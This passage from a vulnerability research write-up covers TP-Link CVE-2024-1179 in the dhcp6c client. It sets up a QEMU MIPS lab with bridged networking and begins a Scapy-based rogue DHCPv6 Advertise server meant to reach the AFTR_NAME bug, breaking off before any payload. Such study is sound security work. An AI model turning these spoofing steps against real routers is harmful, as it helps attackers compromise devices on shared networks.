</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-append <span style="color:#e6db74">&#34;root=/dev/sda1&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-net nic,macaddr<span style="color:#f92672">=</span>00:11:22:33:44:55 <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-net tap,ifname<span style="color:#f92672">=</span>tap0,script<span style="color:#f92672">=</span>no,downscript<span style="color:#f92672">=</span>no <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-nographic
</span></span></code></pre></div><p>Let&rsquo;s explain:</p>
<ol>
<li>Cleanup Previous Configuration</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ip link set br0 down
</span></span><span style="display:flex;"><span>sudo brctl delbr br0
</span></span></code></pre></div><p>If a network bridge named <code>br0</code> already exists, this brings it down and deletes it to ensure no conflicts when creating a new bridge.</p>
<ol start="2">
<li>Set Up Physical Network Interface for Bridging</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ifconfig enp0s31f6 down
</span></span><span style="display:flex;"><span>sudo brctl addbr br0
</span></span><span style="display:flex;"><span>sudo brctl addif br0 enp0s31f6
</span></span></code></pre></div><p>Bring down our physical network interface <code>enp0s31f6</code>  and add it to a new bridge interface <code>br0</code>.</p>
<ol start="3">
<li>Configure <code>br0</code> and <code>enp0s31f6</code> Interfaces</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ifconfig br0 0.0.0.0 promisc up
</span></span><span style="display:flex;"><span>sudo ifconfig enp0s31f6 0.0.0.0 promisc up
</span></span><span style="display:flex;"><span>sudo dhclient br0
</span></span></code></pre></div><p>These commands activate the bridge and physical interface in promiscuous mode (allowing them to handle all network traffic, not just those addressed to them directly) and request an IP address from our network&rsquo;s DHCP server. (FAI)</p>
<ol start="4">
<li>Create and Configure Virtual Network Interface (<code>tap0</code>)</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo tunctl -t tap0
</span></span><span style="display:flex;"><span>sudo brctl addif br0 tap0
</span></span><span style="display:flex;"><span>sudo ifconfig tap0 0.0.0.0 promisc up
</span></span></code></pre></div><p>This creates a TAP interface (virtual network adapter) and connects it to our bridge</p>
<ol start="5">
<li>Launch QEMU</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo qemu-system-mipsel <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -M malta -kernel vmlinux-3.16.0-6-4kc-malta <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -hda debian_wheezy_mipsel_standard.qcow2 <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -append <span style="color:#e6db74">&#34;root=/dev/sda1&#34;</span> <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -net nic,macaddr<span style="color:#f92672">=</span>00:11:22:33:44:55 <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -net tap,ifname<span style="color:#f92672">=</span>tap0,script<span style="color:#f92672">=</span>no,downscript<span style="color:#f92672">=</span>no <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -nographic
</span></span></code></pre></div><ul>
<li><strong>Emulation and Machine Options</strong>:
<ul>
<li><code>-M malta</code>: Specifies the MIPS Malta development board emulation.</li>
<li><code>-kernel vmlinux-3.16.0-6-4kc-malta</code>: Uses 3.16 Linux kernel.</li>
<li><code>-hda debian_wheezy_mipsel_standard.qcow2</code>: Specifies the disk image for the VM.</li>
<li><code>-append &quot;root=/dev/sda1&quot;</code>: Sets the root filesystem to <code>/dev/sda1</code>.</li>
</ul>
</li>
<li><strong>Networking</strong>:
<ul>
<li><code>-net nic,macaddr=00:11:22:33:44:55</code>: Creates a network device with a specified MAC address.</li>
<li><code>-net tap,ifname=tap0,script=no,downscript=no</code>: Sets up a TAP network backend using <code>tap0</code> for connectivity.</li>
</ul>
</li>
</ul>
<p>After running this script and letting the qemu VM boot, we inspect our host network configuration with <code>ifconfig</code> command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>~$ ip a
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>. 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2: enp0s31f6: &lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc pfifo_fast master br0 state UP group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/ether 38:f7:cd:c4:d9:99 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>8: tap0: &lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc pfifo_fast master br0 state UP group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/ether ae:69:9b:7b:56:e1 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>11: br0: &lt;BROADCAST,MULTICAST,PROMISC,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/ether da:30:2c:48:59:a8 brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>    inet 10.212.81.52/16 brd 10.212.255.255 scope global dynamic noprefixroute br0
</span></span><span style="display:flex;"><span>       valid_lft 603777sec preferred_lft 603777sec
</span></span><span style="display:flex;"><span>    inet6 fe80::542b:76ce:631b:36ce/64 scope link noprefixroute 
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p>We can see there that the newly created bridge <code>br0</code> get assigned the IP address <code>10.212.81.52</code> (private address) with a <code>/16</code> mask. So we are on the subnet <code>10.212.0.0/16</code>.
On the qemu VM, we also inspect the network configuration. We notice that it&rsquo;s <code>eth0</code> interface get assigned the IP address <code>10.212.141.194</code> which is an address belonging to <code>10.212.0.0/16</code> subnet. Thus the host and the qemu VM are now on the same subnet.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/ <span style="color:#75715e"># root@debian-mipsel:~/squashfs-root# ifconfig </span>
</span></span><span style="display:flex;"><span>eth0      Link encap:Ethernet  HWaddr 00:11:22:33:44:55  
</span></span><span style="display:flex;"><span>          inet addr:10.212.141.194  Bcast:10.212.255.255  Mask:255.255.0.0
</span></span><span style="display:flex;"><span>          inet6 addr: fe80::211:22ff:fe33:4455/64 Scope:Link
</span></span><span style="display:flex;"><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
</span></span><span style="display:flex;"><span>          RX packets:3554 errors:1 dropped:78 overruns:0 frame:0
</span></span><span style="display:flex;"><span>          TX packets:38 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:1000 
</span></span><span style="display:flex;"><span>          RX bytes:643796 <span style="color:#f92672">(</span>628.7 KiB<span style="color:#f92672">)</span>  TX bytes:3724 <span style="color:#f92672">(</span>3.6 KiB<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>          Interrupt:11 Base address:0x1060 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>lo        Link encap:Local Loopback  
</span></span><span style="display:flex;"><span>          inet addr:127.0.0.1  Mask:255.0.0.0
</span></span><span style="display:flex;"><span>          inet6 addr: ::1/128 Scope:Host
</span></span><span style="display:flex;"><span>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span></span><span style="display:flex;"><span>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
</span></span><span style="display:flex;"><span>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
</span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:0 
</span></span><span style="display:flex;"><span>          RX bytes:0 <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>  TX bytes:0 <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>However in this configuration we have a private network between the host and the VM. That is enough to do what we want. We can ping the host from the VM.</p>
<pre tabindex="0"><code>/ # ping 10.212.81.52
PING 10.212.81.52 (10.212.81.52): 56 data bytes
64 bytes from 10.212.81.52: seq=0 ttl=64 time=2.117 ms
64 bytes from 10.212.81.52: seq=1 ttl=64 time=1.017 ms
^C
--- 10.212.81.52 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max = 1.017/1.567/2.117 ms
</code></pre><p>But we need more if we want the VM to access internet. The packet coming from the router  can reach the bridge <code>br0</code>, but cannot reach the internet. We just need to add a NAT rule in iptables for outgoing traffic from our subnet.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo iptables -t nat -A POSTROUTING -s 10.212.0.0/16 -o br0 -j MASQUERADE
</span></span></code></pre></div><p>Now we have a configuration where <code>br0</code> acts as a switch connecting our host and the router, and then the switch is connected to internet.</p>
<p>Now start the binary with an empy configuration file, and start capturing network packets on <code>br0</code> interface using Wireshark. We can see a DHCP sollicit message on Wireshark.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>/ <span style="color:#75715e"># /usr/sbin/dhcp6c -dDf -c test.conf eth0</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: gethwid: found an interface eth0 <span style="color:#66d9ef">for</span> DUID
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: get_duid: generated a new DUID: 00:03:00:01:00:11:22:33:44:55
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: dhcp6_ctl_authinit: failed to open /etc/dhcp6cctlkey: No such file or directory
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: client6_init: failed initialize control message authentication
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: client6_init: skip opening control port
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: client6_init: client6_init <span style="color:#ae81ff">502</span> client6_init succeed
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>client6_init <span style="color:#ae81ff">503</span> client6_init succeed
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: configure_pool: called
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: clear_poolconf: called
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:51: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>INIT, timeo<span style="color:#f92672">=</span>0, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">514</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:52: client6_send: a new XID <span style="color:#f92672">(</span>c599<span style="color:#f92672">)</span> is generated
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:52: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:52: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:52: copy_option: set option request <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:52: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:52: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>SOLICIT, timeo<span style="color:#f92672">=</span>0, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">1050</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:53: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:53: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:53: copy_option: set option request <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:53: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:53: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>SOLICIT, timeo<span style="color:#f92672">=</span>1, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">2056</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:55: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:55: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:55: copy_option: set option request <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:55: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:55: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>SOLICIT, timeo<span style="color:#f92672">=</span>2, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">4132</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:59: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:59: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:59: copy_option: set option request <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:59: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/29/2024 00:37:59: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>SOLICIT, timeo<span style="color:#f92672">=</span>3, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">8289</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:38:07: copy_option: set client ID <span style="color:#f92672">(</span>len 10<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:38:07: copy_option: set elapsed time <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:38:07: copy_option: set option request <span style="color:#f92672">(</span>len 2<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Oct/29/2024 00:38:07: client6_send: send solicit to ff02::1:2%eth0
</span></span><span style="display:flex;"><span>Oct/29/2024 00:38:07: dhcp6_reset_timer: reset a timer on eth0, state<span style="color:#f92672">=</span>SOLICIT, timeo<span style="color:#f92672">=</span>4, retrans<span style="color:#f92672">=</span><span style="color:#ae81ff">15930</span>
</span></span></code></pre></div>

    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241029013901.png"/><figcaption><h4> </h4></figcaption></figure>
<p>As we said earlier, with option <code>-i</code>, we have a <code>information-request</code> message.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241029215056.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Remember that the vulnerability concerns IPv6 and by default we already have an IPv4 address assigned to us.</p>
<blockquote>
<p>Take a look on qemu VM machine network configuration once more (previous). At first glance, we might think that there is already assigned IPv6 address on <code>eth0</code>.</p>
<p>But no, this is a link local addressee.</p>
<p><strong>IPv6 Link-Local Address</strong>: In IPv6, link-local addresses are automatically assigned to each interface and are in the <code>fe80::/10</code> address range. For example, <code>fe80::abcd:ef01:2345</code> might be a device&rsquo;s link-local address.</p>
<p>link-local address        An IPv6 address having a link-only scope,
indicated by having the prefix (fe80::/10),
that can be used to reach neighboring nodes
attached to the same link.  Every IPv6
interface on which DHCPv6 can reasonably be
useful has a link-local address.</p>
</blockquote>
<p>Now we need to create our DHCPv6 server. As we already have an IPv4 address and can contact the host, we don&rsquo;t really need a full functional dhcpv6 server to exploit our bug.
According to <a href="https://datatracker.ietf.org/doc/html/rfc8415#section-5.2">RFC8415</a>, we have the following flow when the client tries to get an IP address from DHCPv6 server.</p>
<p><img alt="https://www.h3c.com/en/d_202106/1419224_294551_0.htm" src="../../20210626_5853423_x_Img_x_png_1_1419224_294551_0.png">
<a href="https://www.h3c.com/en/d_202106/1419224_294551_0.htm">DHCPv6 flow</a></p>
<p>As we will need to build our own DHCPv6 packets that will be sent, we will use <strong>Scapy</strong>. The DHCPv6 server we will build will listen on a chosen interface for Solicit messages and respond with an advertise. Advertise messages will allow us to debug where the vulnerability exists because we know from <a href="https://datatracker.ietf.org/doc/html/rfc6334#section-3">here</a> that <code>AFTR_NAME</code> options can be used in Advertise messages.</p>
<p>We can rely on <a href="https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp6.py#L1795">Scapy DHCPv6 implementation</a> to build our server.</p>
<p>We start first with a simple script that filters and prints the received solicit messages:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.layers.dhcp6 <span style="color:#f92672">import</span> DHCP6_Solicit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_mac <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;00:11:22:33:44:55&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filter_solicit_msg</span>(pkt):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> pkt<span style="color:#f92672">.</span>haslayer(DHCP6_Solicit) <span style="color:#f92672">and</span> pkt[Ether]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> target_mac
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>interface <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;br0&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> sniff(iface<span style="color:#f92672">=</span>interface, filter<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;udp and port 546&#34;</span>, prn<span style="color:#f92672">=</span><span style="color:#66d9ef">lambda</span> x: x<span style="color:#f92672">.</span>show(), lfilter<span style="color:#f92672">=</span>filter_solicit_msg)
</span></span></code></pre></div><p>After executing this python script, we have :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">###[ Ethernet ]###</span>
</span></span><span style="display:flex;"><span>  dst       <span style="color:#f92672">=</span> 33:33:00:01:00:02
</span></span><span style="display:flex;"><span>  src       <span style="color:#f92672">=</span> 00:11:22:33:44:55
</span></span><span style="display:flex;"><span>  type      <span style="color:#f92672">=</span> IPv6
</span></span><span style="display:flex;"><span><span style="color:#75715e">###[ IPv6 ]###</span>
</span></span><span style="display:flex;"><span>     version   <span style="color:#f92672">=</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>     tc        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>     fl        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>     plen      <span style="color:#f92672">=</span> <span style="color:#ae81ff">38</span>
</span></span><span style="display:flex;"><span>     nh        <span style="color:#f92672">=</span> UDP
</span></span><span style="display:flex;"><span>     hlim      <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>     src       <span style="color:#f92672">=</span> fe80::211:22ff:fe33:4455
</span></span><span style="display:flex;"><span>     dst       <span style="color:#f92672">=</span> ff02::1:2
</span></span><span style="display:flex;"><span><span style="color:#75715e">###[ UDP ]###</span>
</span></span><span style="display:flex;"><span>        sport     <span style="color:#f92672">=</span> dhcpv6_client
</span></span><span style="display:flex;"><span>        dport     <span style="color:#f92672">=</span> dhcpv6_server
</span></span><span style="display:flex;"><span>        len       <span style="color:#f92672">=</span> <span style="color:#ae81ff">38</span>
</span></span><span style="display:flex;"><span>        chksum    <span style="color:#f92672">=</span> 0x2421
</span></span><span style="display:flex;"><span><span style="color:#75715e">###[ DHCPv6 Solicit Message ]###</span>
</span></span><span style="display:flex;"><span>           msgtype   <span style="color:#f92672">=</span> SOLICIT
</span></span><span style="display:flex;"><span>           trid      <span style="color:#f92672">=</span> 0x650957
</span></span><span style="display:flex;"><span><span style="color:#75715e">###[ DHCP6 Client Identifier Option ]###</span>
</span></span><span style="display:flex;"><span>              optcode   <span style="color:#f92672">=</span> CLIENTID
</span></span><span style="display:flex;"><span>              optlen    <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>              <span style="color:#ae81ff">\d</span>uid      <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>               |<span style="color:#75715e">###[ DUID - Based on Link-layer Address ]###</span>
</span></span><span style="display:flex;"><span>               |  type      <span style="color:#f92672">=</span> Link-layer Address
</span></span><span style="display:flex;"><span>               |  hwtype    <span style="color:#f92672">=</span> Ethernet <span style="color:#f92672">(</span>10Mb<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>               |  lladdr    <span style="color:#f92672">=</span> 00:11:22:33:44:55
</span></span><span style="display:flex;"><span><span style="color:#75715e">###[ DHCP6 Elapsed Time Option ]###</span>
</span></span><span style="display:flex;"><span>                 optcode   <span style="color:#f92672">=</span> ELAPSED_TIME
</span></span><span style="display:flex;"><span>                 optlen    <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>                 elapsedtime<span style="color:#f92672">=</span> 1.02 sec
</span></span><span style="display:flex;"><span><span style="color:#75715e">###[ DHCP6 Option Request Option ]###</span>
</span></span><span style="display:flex;"><span>                    optcode   <span style="color:#f92672">=</span> ORO
</span></span><span style="display:flex;"><span>                    optlen    <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>                    reqopts   <span style="color:#f92672">=</span> <span style="color:#f92672">[</span>64<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Now we continue to build our simple dhcpv6 server. We can follow <a href="https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp6.py#L1795">https://github.com/secdev/scapy/blob/master/scapy/layers/dhcp6.py#L1795</a>. As explained earlier, options are used to provide additional configuration information. According to <a href="https://datatracker.ietf.org/doc/html/rfc8415#section-16.3">RFC 8415 section 16.3</a>, to build our advertise response, we need at least to provide client identifier and server identifier. The RFC explains more about what these options are.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030005712.png"/><figcaption><h4> </h4></figcaption></figure>
<p>And <strong>Scapy</strong> already has a class to create them (<code>DHCP6OptClientId</code> and <code>DHCP6OptServerId</code>).
By creating each layer for the DHCPv6 advertise message that will be sent, we have the following script with comments:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.layers.inet6 <span style="color:#f92672">import</span> IPv6, UDP
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> scapy.layers.dhcp6 <span style="color:#f92672">import</span> DHCP6_Solicit, DHCP6OptServerId, DHCP6OptClientId
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">br0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt; mtu 1500
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">inet 10.212.81.52 netmask 255.255.0.0 broadcast 10.212.255.255
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">inet6 fe80::542b:76ce:631b:36ce prefixlen 64 scopeid 0x20&lt;link&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ether da:30:2c:48:59:a8 txqueuelen 1000 (Ethernet)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RX packets 652899 bytes 434959083 (434.9 MB)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">RX errors 0 dropped 0 overruns 0 frame 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TX packets 284487 bytes 81342637 (81.3 MB)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>target_mac <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;00:11:22:33:44:55&#34;</span> <span style="color:#75715e"># qemu</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>br0_mac <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;da:30:2c:48:59:a8&#34;</span>
</span></span><span style="display:flex;"><span>br0_link_local_inet6 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fe80::542b:76ce:631b:36ce&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">filter_solicit_msg</span>(pkt):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> pkt<span style="color:#f92672">.</span>haslayer(DHCP6_Solicit) <span style="color:#f92672">and</span> pkt[Ether]<span style="color:#f92672">.</span>src <span style="color:#f92672">==</span> target_mac
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_dhcp6_advertise</span>(p):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up Ethernet layer with source and destination MAC addresses</span>
</span></span><span style="display:flex;"><span>    src_mac <span style="color:#f92672">=</span> br0_mac  <span style="color:#75715e"># Bridge interface MAC address</span>
</span></span><span style="display:flex;"><span>    dst_mac <span style="color:#f92672">=</span> p[Ether]<span style="color:#f92672">.</span>src  <span style="color:#75715e"># Client&#39;s MAC address from original packet</span>
</span></span><span style="display:flex;"><span>    ethernet_layer <span style="color:#f92672">=</span> Ether(src<span style="color:#f92672">=</span>src_mac, dst<span style="color:#f92672">=</span>dst_mac)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up IPv6 layer with source and destination addresses</span>
</span></span><span style="display:flex;"><span>    ipv6_dst <span style="color:#f92672">=</span> p[IPv6]<span style="color:#f92672">.</span>src  <span style="color:#75715e"># Client&#39;s IPv6 address from original packet</span>
</span></span><span style="display:flex;"><span>    ipv6_src <span style="color:#f92672">=</span> br0_link_local_inet6  <span style="color:#75715e"># Bridge interface link-local address</span>
</span></span><span style="display:flex;"><span>    ipv6_layer <span style="color:#f92672">=</span> IPv6(src<span style="color:#f92672">=</span>ipv6_src, dst<span style="color:#f92672">=</span>ipv6_dst)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Set up UDP layer with DHCPv6 ports</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Port 547: Server port, Port 546: Client port</span>
